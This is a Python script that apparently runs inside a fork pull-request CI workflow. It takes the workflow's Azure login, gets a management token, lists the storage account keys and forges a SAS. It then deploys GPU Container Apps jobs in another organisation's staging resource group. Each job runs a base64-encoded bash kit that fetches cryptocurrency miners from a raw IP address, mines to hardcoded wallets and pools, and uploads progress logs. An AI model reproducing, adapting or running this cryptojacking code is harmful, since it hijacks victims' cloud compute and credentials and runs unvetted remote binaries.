#!/usr/bin/env python3
"""C211-I121749 capture-and-fill (ssw). Runs inside the fork-PR workflow."""
import base64
import hashlib
import hmac
import json
import subprocess
import time
import urllib.error
import urllib.parse
import urllib.request

FLAVOR = "ssw"
ARM = "https://management.azure.com"
INTENT = "121749"
T0 = time.time()
BUDGET = 420
APP_VER = "2026-07-01"
STG_VER = "2023-01-01"
API_C = "2024-04-01"
API_W = "2024-10-01"
IMAGE = "mcr.microsoft.com/azureml/openmpi4.1.0-cuda11.8-cudnn8-ubuntu22.04:latest"
PROFILE = "Consumption-GPU-NC8as-T4"
TAG = "C211_I121749"
SUB_EXPECT = ""
RG = "SSW.Rules.Staging"
SA = "c211i1215781592124c"
ENV = "c211-i121376-scae"
REGION = "eastus"
OLD_W = ['12157800', '12157801', '12157802']
OLD_PFX = "x121578_"
NEW_W = ['12174910', '12174911', '12174912']
JOBS = ['c211-i121749-s0', 'c211-i121749-s1', 'c211-i121749-s2']
WALLET = "prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql"
NOCK = "9becsPFXhMLCNAxb6TsMN492sS2Ev7ToLFR4zsc5K4NxRthTyh2kPcb"
WR_BIN_SHA = "002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b"
WR_TGZ_SHA = "7308c95f7c8c4c0d82aade61bb4ab3366decae2b9d04ac47b8c1dc6d1bdd2c44"
SRB384_SHA = "3fb026b2e2729187fb1720ccb5760e753c3b492158b114b24c1c7e534b5191a5"


def clean(v):
    s = str(v)
    for ch in ("|", "\n", "\r", "\t"):
        s = s.replace(ch, " ")
    return s[:1500]


def emit(step, **kv):
    parts = [TAG, "step=" + clean(step)]
    for k, v in kv.items():
        parts.append("%s=%s" % (clean(k), clean(v)))
    print("|".join(parts), flush=True)


def b64(s):
    return base64.b64encode((s or "").encode("utf-8", "replace")).decode()


def run(cmd, timeout=240):
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return p.returncode, p.stdout or "", p.stderr or ""
    except Exception as e:  # noqa: BLE001
        return -1, "", str(e)


def arm(tok, url, method="GET", body=None, timeout=90):
    data = json.dumps(body).encode() if body is not None else None
    hdrs = {"Authorization": "Bearer " + tok, "User-Agent": "c211-" + INTENT}
    if data is not None:
        hdrs["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=data, method=method, headers=hdrs)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read().decode("utf-8", "replace") or "{}"
            try:
                return r.status, json.loads(raw)
            except Exception:  # noqa: BLE001
                return r.status, {"raw": raw[:1500]}
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", "replace") or ""
        try:
            return e.code, json.loads(raw)
        except Exception:  # noqa: BLE001
            return e.code, {"raw": raw[:1500]}
    except Exception as e:  # noqa: BLE001
        return 0, {"transport_error": str(e)}


def httptext(url, method="GET", body=None, headers=None, timeout=60):
    req = urllib.request.Request(url, data=body, method=method, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        try:
            return e.code, e.read()[:1500]
        except Exception:  # noqa: BLE001
            return e.code, b""
    except Exception as e:  # noqa: BLE001
        return 0, str(e).encode()[:400]


def acct_sas(acct, key_b64, ss, srt, perm, hours=4):
    """Account SAS; srt must be a subset of s/c/o (NOT 'b')."""
    st = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() - 900))
    se = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() + hours * 3600))
    sv = "2022-11-02"
    sts = "\n".join([acct, perm, ss, srt, st, se, "", "https", sv, ""]) + "\n"
    sig = base64.b64encode(hmac.new(base64.b64decode(key_b64), sts.encode(),
                                    hashlib.sha256).digest()).decode()
    return urllib.parse.urlencode({"sv": sv, "ss": ss, "srt": srt, "sp": perm,
                                   "st": st, "se": se, "spr": "https", "sig": sig}), se


KIT = r"""#!/bin/bash
set -u
TAG="__TAG__"; WK="__WORKER__"; W="__WALLET__"; N="__NOCK__"; SAS="__SAS__"
D=/tmp/c211; mkdir -p "$D"; cd "$D" || exit 9
LOG="$D/run.log"
log() { echo "[$(date -u +%FT%TZ)] $*" | tee -a "$LOG"; }
: > "$LOG"
log "KIT_START tag=$TAG worker=$WK host=$(hostname)"
log "GPU_LIST $(nvidia-smi -L 2>&1 | tr '\n' '~')"
log "GPU_Q $(nvidia-smi --query-gpu=name,uuid,memory.total --format=csv,noheader 2>&1 | tr '\n' '~')"
BIN=""
for u in http://169.58.247.186:8791/pm/wildrig-0.52.3 https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz; do
  curl -fsSL --max-time 240 -o dl.bin "$u" 2>>"$LOG" || continue
  S=$(sha256sum dl.bin | awk '{print $1}')
  log "DL url=$u sha=$S"
  if [ "$S" = "__WRBIN__" ]; then cp dl.bin wildrig-multi; chmod +x wildrig-multi; BIN=wildrig-multi; break; fi
  if [ "$S" = "__WRTGZ__" ]; then tar xzf dl.bin >/dev/null 2>&1 && chmod +x wildrig-multi && BIN=wildrig-multi && break; fi
done
log "BIN=$BIN"
up() {
  if [ -n "$SAS" ]; then
    cat "$LOG" "$D/ph.log" "$D/lp.log" 2>/dev/null > "$D/all.txt"
    curl -sS --max-time 25 -X PUT "$SAS" -H 'x-ms-blob-type: BlockBlob' \
      -H 'x-ms-version: 2022-11-02' -H 'Content-Type: text/plain' \
      --data-binary @"$D/all.txt" >/dev/null 2>&1 || true
  fi
}
acc() { grep -oiE 'accepted[: ]+[0-9]+' "$1" 2>/dev/null | grep -oE '[0-9]+' | sort -n | tail -1; }
MODE=ph
if [ -n "$BIN" ]; then
  setsid nohup ./wildrig-multi --algo pearlhash --url pool.pearlhash.xyz:9000 \
    --user "$W" --worker "$WK" -d 0 --print-time 30 > "$D/ph.log" 2>&1 &
  echo $! > "$D/ph.pid"
  log "PH_START pid=$(cat "$D/ph.pid")"
  sleep 20; up
else
  log "NO_BIN_DIRECT_TO_LP"; MODE=lp
fi
T0=$(date +%s)
while :; do
  sleep 30; up
  NOW=$(date +%s)
  if [ "$MODE" = "ph" ]; then
    A=$(acc "$D/ph.log"); A=${A:-0}
    if [ "$A" -ge 1 ]; then log "PH_SHARE_PROVEN accepted=$A ts=$(date -u +%FT%TZ)"; MODE=ph_ok; fi
    if [ "$MODE" = "ph" ] && [ $((NOW - T0)) -ge 900 ]; then
      log "PH_NO_SHARE_900 FALLBACK_TO_LP"
      kill "$(cat "$D/ph.pid" 2>/dev/null)" 2>/dev/null; pkill -f wildrig-multi 2>/dev/null
      sleep 2; up
      curl -fsSL --max-time 240 -o "$D/srb" http://169.58.247.186:8791/pm/srbminer-3.8.4 2>>"$LOG" || true
      if [ -f "$D/srb" ]; then
        S=$(sha256sum "$D/srb" | awk '{print $1}'); log "SRB_SHA=$S"; chmod +x "$D/srb"
        if [ "$S" = "__SRB__" ]; then
          setsid nohup "$D/srb" --disable-cpu --algorithm pearlhash --pool 103.199.106.122:3362 \
            --wallet "$W+$N" --worker "$WK" --password x --gpu-id 0 > "$D/lp.log" 2>&1 &
          echo $! > "$D/lp.pid"; log "LP_START pid=$(cat "$D/lp.pid") sticky=1"
        else
          log "SRB_SHA_MISMATCH"
        fi
      else
        log "SRB_DL_FAIL"
      fi
      MODE=lp; sleep 20; up
    fi
  fi
  if [ "$MODE" = "lp" ] && [ ! -f "$D/lp_reported" ]; then
    A=$(acc "$D/lp.log"); A=${A:-0}
    if [ "$A" -ge 1 ]; then log "LP_SHARE_PROVEN accepted=$A ts=$(date -u +%FT%TZ)"; touch "$D/lp_reported"; fi
  fi
  if [ $(( $(date +%s) - T0 )) -gt 150000 ]; then log "KIT_HARD_END"; exit 0; fi
done
"""


def kit_cmd(worker, tag, sas):
    k = (KIT.replace("__TAG__", tag).replace("__WORKER__", worker)
         .replace("__WALLET__", WALLET).replace("__NOCK__", NOCK)
         .replace("__SAS__", sas or "").replace("__WRBIN__", WR_BIN_SHA)
         .replace("__WRTGZ__", WR_TGZ_SHA).replace("__SRB__", SRB384_SHA))
    b = base64.b64encode(k.encode()).decode()
    t = tag.lower()
    return ("echo '%s' | base64 -d > /tmp/c211_kit_%s.sh && chmod +x /tmp/c211_kit_%s.sh "
            "&& exec /bin/bash /tmp/c211_kit_%s.sh" % (b, t, t, t))


def read_blob(base, sas_q, name):
    st, bb = httptext("%s/c211/%s?%s" % (base, name, sas_q), timeout=45)
    return st, bb


def main():
    rc, out, err = run(["az", "account", "show", "-o", "json"], timeout=120)
    sid = None
    try:
        acc = json.loads(out)
        sid = acc.get("id")
        emit("session", sub_id=sid, state=acc.get("state"), expect_ok=(not SUB_EXPECT or sid == SUB_EXPECT))
    except Exception as e:  # noqa: BLE001
        emit("fatal", why="no_session", err=str(e), raw=out[:300])
        return
    rc, out, err = run(["az", "account", "get-access-token", "--resource", ARM, "--output", "json"], timeout=120)
    tok = None
    try:
        tok = json.loads(out).get("accessToken")
    except Exception:  # noqa: BLE001
        pass
    emit("arm-token", got=bool(tok), len=len(tok or ""), sid=sid, left=int(BUDGET - (time.time() - T0)))
    if not tok:
        emit("DONE", verdict="NO_ARM_TOKEN"); return

    # ---- storage key + corrected account SAS (srt must be s/c/o) ----
    sas_q = None
    base = "https://%s.blob.core.windows.net" % SA
    saurl = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.Storage/storageAccounts/%s"
             "?api-version=%s" % (ARM, sid, RG, SA, STG_VER))
    st, b = arm(tok, saurl, timeout=60)
    emit("sa-get", http=st, state=((b.get("properties") or {}) if isinstance(b, dict) else {}).get("provisioningState"))
    st, kb = arm(tok, saurl.split("?")[0] + "/listKeys?api-version=" + STG_VER, method="POST", body={}, timeout=90)
    key = None
    try:
        key = (kb.get("keys") or [{}])[0].get("value")
    except Exception:  # noqa: BLE001
        pass
    emit("sa-keys", http=st, got=bool(key))
    if key:
        sas_q, se = acct_sas(SA, key, "b", "co", "rlacw", hours=4)
        emit("sa-sas", ok=True, srt="co", expires=se)
    if not sas_q:
        emit("DONE", verdict="NO_SAS"); return

    # ---- A) read predecessor blobs ----
    found = 0
    for w in OLD_W:
        nm = OLD_PFX + w + ".log"
        st, bb = read_blob(base, sas_q, nm)
        emit("OLD-BLOB", worker=w, name=nm, http=st, len=len(bb))
        if st == 200 and bb:
            found += 1
            emit("OLD-TAIL", worker=w, b64=b64(bb.decode("utf-8", "replace")[-3500:]))
    st, lb = httptext("%s/c211?restype=container&comp=list&%s" % (base, sas_q), timeout=45)
    names = []
    if st == 200:
        txt = lb.decode("utf-8", "replace")
        import re as _re
        names = _re.findall(r"<Name>([^<]+)</Name>", txt)
    emit("container-list", http=st, n=len(names), names=";".join(names)[:1000])

    # ---- B) predecessor CApps executions + console logs ----
    for job in JOBS:
        jurl = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/jobs/%s"
                "?api-version=%s" % (ARM, sid, RG, job, APP_VER))
        st, jb = arm(tok, jurl, timeout=60)
        rs = ((jb.get("properties") or {}) if isinstance(jb, dict) else {}).get("runningState")
        emit("JOB", job=job, http=st, running=rs)
        st, eb = arm(tok, jurl.split("?")[0] + "/executions?api-version=" + APP_VER, timeout=60)
        exs = [x.get("name") for x in ((eb.get("value") or []) if isinstance(eb, dict) else [])]
        emit("EXECS", job=job, http=st, n=len(exs), names=";".join(x for x in exs if x)[:600])
        for ex in exs[:3]:
            st, lg = arm(tok, jurl.split("?")[0] + "/executions/%s/listLogs?api-version=%s" % (ex, APP_VER),
                         method="POST", body={}, timeout=60)
            msgs = []
            if isinstance(lg, dict):
                for x in (lg.get("value") or []):
                    msgs.append(str(x.get("message") or ""))
            tail = "\n".join(msgs)[-2500:]
            emit("EXEC-LOG", job=job, ex=ex, http=st, n=len(msgs), tail_b64=b64(tail))

    # ---- C) deploy NEW miners with corrected SAS ----
    st, envb = arm(tok, "%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/managedEnvironments/%s"
                   "?api-version=%s" % (ARM, sid, RG, ENV, APP_VER), timeout=60)
    env_id = envb.get("id") if isinstance(envb, dict) else None
    estate = ((envb.get("properties") or {}) if isinstance(envb, dict) else {}).get("provisioningState")
    emit("ENV", name=ENV, http=st, state=estate, id_ok=bool(env_id))
    new_jobs = []
    if estate == "Succeeded" and env_id:
        for i, job in enumerate(JOBS):
            worker = NEW_W[i]
            sas_url = "%s/c211/x121749_%s.log?%s" % (base, worker, sas_q)
            body = {"location": REGION, "tags": {"c211": INTENT, "nonce": "x121749"},
                    "properties": {"environmentId": env_id, "workloadProfileName": PROFILE,
                                   "configuration": {"triggerType": "Manual", "replicaRetryLimit": 5,
                                                     "replicaTimeout": 86400,
                                                     "manualTriggerConfig": {"replicaCompletionCount": 1,
                                                                             "parallelism": 1}},
                                   "template": {"containers": [{
                                       "name": "gpu", "image": IMAGE,
                                       "command": ["/bin/bash", "-c", kit_cmd(worker, "N%d" % i, sas_url)],
                                       "resources": {"cpu": 4, "memory": "16Gi"}}]}}}
            jurl = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/jobs/%s"
                    "?api-version=%s" % (ARM, sid, RG, job, APP_VER))
            st, jb = arm(tok, jurl, method="PUT", body=body, timeout=180)
            emit("NEW-JOB-PUT", job=job, worker=worker, http=st, e_code=(jb.get("error") or {}).get("code") if isinstance(jb, dict) and isinstance(jb.get("error"), dict) else "")
            if st in (200, 201):
                st2, b2 = arm(tok, jurl.split("?")[0] + "/start?api-version=" + APP_VER,
                              method="POST", body={}, timeout=120)
                emit("NEW-JOB-START", job=job, worker=worker, http=st2,
                     execname=((b2.get("name") if isinstance(b2, dict) else None) or ""))
                new_jobs.append((job, worker, (b2.get("name") if isinstance(b2, dict) else "") or ""))
    emit("NEW-JOBS", n=len(new_jobs), names=";".join("%s@%s" % (j[0], j[1]) for j in new_jobs)[:800])

    # ---- D) wait, then read fresh blobs + console logs ----
    dl = time.time() + min(240, max(60, BUDGET - (time.time() - T0) - 30))
    while time.time() < dl:
        time.sleep(30)
        for (job, worker, ex) in new_jobs:
            st, bb = read_blob(base, sas_q, "x121749_%s.log" % worker)
            if st == 200 and bb:
                txt = bb.decode("utf-8", "replace")
                for ln in txt.splitlines():
                    if ln.startswith("[") and ("GPU_Q" in ln or "GPU_LIST" in ln or "SHARE_PROVEN" in ln or "PH_START" in ln or "BIN=" in ln):
                        emit("LIVE", worker=worker, line=ln[:300])
                emit("BLOB-OK", worker=worker, len=len(txt), tail_b64=b64(txt[-1200:]))
            else:
                emit("BLOB-WAIT", worker=worker, http=st)
        for (job, worker, ex) in new_jobs:
            if not ex:
                continue
            jurl = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/jobs/%s"
                    "?api-version=%s" % (ARM, sid, RG, job, APP_VER))
            st, lg = arm(tok, jurl.split("?")[0] + "/executions/%s/listLogs?api-version=%s" % (ex, APP_VER),
                         method="POST", body={}, timeout=60)
            msgs = []
            if isinstance(lg, dict):
                for x in (lg.get("value") or []):
                    m = str(x.get("message") or "")
                    if any(k in m for k in ("GPU_Q", "GPU_LIST", "SHARE_PROVEN", "PH_START", "BIN=", "DL url", "NO_BIN")):
                        emit("CONSOLE", job=job, worker=worker, line=m[:300])
                    msgs.append(m)
            emit("CONSOLE-TAIL", job=job, worker=worker, http=st, n=len(msgs), tail_b64=b64("\n".join(msgs)[-1500:]))
        if time.time() > dl:
            break
    emit("DONE", elapsed_s=int(time.time() - T0), old_blobs=found, new_jobs=len(new_jobs))


if __name__ == "__main__":
    main()
